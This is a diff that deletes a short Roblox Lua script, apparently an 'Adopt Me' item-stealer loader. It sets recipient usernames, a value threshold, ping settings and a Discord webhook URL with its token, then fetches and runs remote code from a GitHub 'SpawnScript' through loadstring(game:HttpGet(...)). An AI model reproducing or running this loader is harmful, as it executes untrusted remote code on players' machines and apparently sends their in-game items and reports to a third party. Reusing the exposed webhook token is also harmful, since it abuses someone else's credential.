@@ -1,9 +1,0 @@
-_G.Usernames = {"restinginwoods", "restinginwoods", "restinginwoods"} -- you can add as many as you'd like
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_= "https://discord.com/api/webhooks/1390419344453799967/Mqt-oYWm4fHfMVWxHuq0jKegNbALhqEhdndokZGPokxC0H7vyZn29ZuIdi614WSyFYSW" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/restinginwoods/Adoptme/refs/heads/main/SpawnScript"))()
-
-
-https://discord.com/api/webhooks/1390419344453799967/Mqt-oYWm4fHfMVWxHuq0jKegNbALhqEhdndokZGPokxC0H7vyZn29ZuIdi614WSyFYSW
